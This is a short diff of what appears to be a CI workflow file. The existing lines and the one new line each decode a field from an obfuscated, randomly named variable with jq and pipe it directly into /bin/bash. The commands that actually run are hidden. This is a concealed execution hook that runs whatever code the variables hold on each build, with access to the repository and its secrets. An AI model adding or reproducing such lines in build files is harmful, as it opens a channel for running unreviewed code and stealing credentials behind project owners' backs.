@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$jain86878" | jq -r .hvgd0850 | /bin/bash
           echo $yyofk66880 | jq -r .bpnt3817 | /bin/bash
           printf '%s' "$mqkp5701" | jq -r .nlqdg4291 | /bin/bash
+          printf '%s' "$vlmg20" | jq -r .x2 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
